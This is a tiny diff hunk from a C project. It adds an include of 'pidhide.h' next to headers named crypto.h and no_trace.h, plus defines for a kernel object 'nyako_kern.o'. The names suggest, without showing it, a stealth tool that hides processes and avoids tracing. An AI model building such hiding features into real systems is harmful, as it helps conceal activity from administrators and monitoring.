@@ -17,6 +17,7 @@
 #include "crypto.h"
 #include "constants.h"
 #include "no_trace.h"
+#include "pidhide.h"
 
 #define NYAKO_KERN_FILENAME "nyako_kern.o"
 #define NYAKO_KERN_PROGSEC "nyako_kern"
